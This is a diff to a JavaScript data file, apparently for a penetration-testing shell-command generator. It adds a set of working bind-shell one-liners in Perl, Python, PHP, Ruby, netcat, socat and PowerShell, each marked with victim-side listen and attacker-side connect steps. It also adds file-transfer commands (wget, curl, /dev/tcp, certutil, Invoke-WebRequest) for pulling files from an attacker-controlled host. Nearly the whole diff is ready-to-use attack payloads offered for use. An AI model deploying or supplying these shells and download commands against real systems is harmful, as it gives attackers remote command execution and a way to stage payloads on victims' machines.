@@ -509,4 +509,200 @@ pty.spawn("bash")'`,
     }
 };
 
-const bindShells = {};
+const bindShells = {
+    "bind_shell": {
+        "perl": [
+            {
+                "title": "Perl bind shell (Linux/Unix)",
+                "platform": "Linux/Unix",
+                "command": `# Victim (listen)
+perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));\
+bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\
+close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
+
+# Connect from attacker
+nc {ip} {port}`,
+                "highlight": "language-bash",
+                "shorttag": "Perl TCP Bind shell"
+            }
+        ],
+        "python": [
+            {
+                "title": "Python bind shell (Linux/Unix, single line)",
+                "platform": "Linux/Unix, Python 3",
+                "command": `# Victim (listen)
+python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",{port}));s1.listen(1);c,a=s1.accept();
+while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+
+# Connect from attacker
+nc {ip} {port}
+`,
+                "highlight": "language-bash",
+                "shorttag": "Python single line"
+            }
+        ],
+        "php": [
+            {
+                "title": "PHP bind shell (Linux/Unix)",
+                "platform": "Linux/Unix",
+                "command": `# Victim (listen)                
+php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",{port});\
+socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;\
+$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);\
+socket_write($cl,$m,strlen($m));}}'
+
+# Connect from attacker
+nc {ip} {port}
+`,
+                "highlight": "language-bash",
+                "shorttag": "PHP bind shell"
+            }
+        ],
+        "ruby": [
+            {
+                "title": "Ruby bind shell (Linux/Unix)",
+                "platform": "Linux/Unix",
+                "command": `# Victim (listen)
+ruby -rsocket -e 'f=TCPServer.new({port}); s=f.accept; [0, 1, 2].each { |fd| IO.for_fd(fd).reopen(s) }; exec "/bin/sh"'
+
+# Connect from attacker
+nc {ip} {port}
+`,
+                "highlight": "language-bash",
+                "shorttag": "Ruby bind shell"
+            }
+        ],
+        "nc (traditional)": [
+            {
+                "title": "Netcat Traditional bind shell",
+                "platform": "Linux/Unix",
+                "command": `# Victim (listen)
+nc -nlvp {port} -e /bin/bash
+
+# Connect from attacker
+nc {ip} {port}
+`,
+                "highlight": "language-bash",
+                "shorttag": "Netcat Traditional"
+            }
+        ],
+        "nc OpenBsd": [
+            {
+                "title": "Netcat OpenBsd bind shell",
+                "platform": "Linux/Unix",
+                "command": `# Victim (listen)
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp {port} >/tmp/f
+
+# Connect from attacker
+nc {ip} {port}
+
+`,
+                "highlight": "language-bash",
+                "shorttag": "Netcat OpenBsd"
+            }
+        ],
+        "socat": [
+            {
+                "title": "Socat bind shell",
+                "platform": "Linux/Unix",
+                "command": `# Victim (listen)
+socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
+
+# Connect from attacker
+socat FILE:\`tty\`,raw,echo=0 TCP:{ip}:{port}`,
+                "highlight": "language-bash",
+                "shorttag": "Socat bind shell"
+            }
+        ],
+        "powershell": [
+            {
+                "title": "Powershell bind shell",
+                "platform": "Windows",
+                "command": `# https://github.com/besimorhino/powercat
+
+# Victim (listen)
+. .\\powercat.ps1
+powercat -l -p {port} -ep
+
+# Connect from attacker
+. .\\powercat.ps1
+powercat -c {ip} -p {port}`,
+                "highlight": "language-powershell",
+                "shorttag": "Powershell bind shell"
+            }
+        ]
+    }
+};
+
+const transferMethods = {
+    "transfer_files": {
+        "linux": [
+            {
+                "title": "Transfer files using /dev/tcp",
+                "platform": "Linux/Unix",
+                "command": `# Using /dev/tcp
+{ exec 3<> /dev/tcp/{ip}/{port} && printf '%s\\r\\n' 'GET {filepath} HTTP/1.1' 'Host: host' 'Connection: close' '' >&3 && cat <&3 && exec 3<&-; } > {newfilename}`,
+                "highlight": "language-bash",
+                "shorttag": "/dev/tcp"
+            },
+            {
+                "title": "Transfer files using Telnet",
+                "platform": "Linux/Unix",
+                "command": `# Using Telnet
+(echo "GET {filepath} HTTP/1.1"; echo ""; sleep 1) | telnet {ip} {port} > {newfilename}`,
+                "highlight": "language-bash",
+                "shorttag": "Telnet"
+            },
+            {
+                "title": "Transfer files using Wget",
+                "platform": "Linux/Unix",
+                "command": `# Using Wget
+wget http://{ip}:{port}{filepath} -O {newfilename}`,
+                "highlight": "language-bash",
+                "shorttag": "Wget"
+            },
+            {
+                "title": "Transfer files using Curl",
+                "platform": "Linux/Unix",
+                "command": `# Using Curl
+curl http://{ip}:{port}{filepath} -o {newfilename}`,
+                "highlight": "language-bash",
+                "shorttag": "Curl"
+            }
+        ],
+        "windows": [
+            {
+                "title": "Transfer files using CMD (Certutil)",
+                "platform": "Windows",
+                "command": `# Using CMD
+certutil -urlcache -split -f http://{ip}:{port}{filepath} C:\\{newfilename}`,
+                "highlight": "language-powershell",
+                "shorttag": "CMD"
+            },
+            {
+                "title": "Transfer files using PowerShell",
+                "platform": "Windows",
+                "command": `# Using PowerShell
+Invoke-WebRequest -Uri http://{ip}:{port}{filepath} -OutFile C:\\{newfilename}`,
+                "highlight": "language-powershell",
+                "shorttag": "PowerShell"
+            },
+            {
+                "title": "Transfer files using Curl",
+                "platform": "Windows",
+                "command": `# Using Curl
+curl http://{ip}:{port}{filepath} -o C:\\{newfilename}`,
+                "highlight": "language-bash",
+                "shorttag": "Curl"
+            },
+            {
+                "title": "Transfer files using Wget",
+                "platform": "Windows",
+                "command": `# Using Wget
+wget http://{ip}:{port}{filepath} -O C:\\{newfilename}`,
+                "highlight": "language-bash",
+                "shorttag": "Wget"
+            }
+        ]
+    }
+};
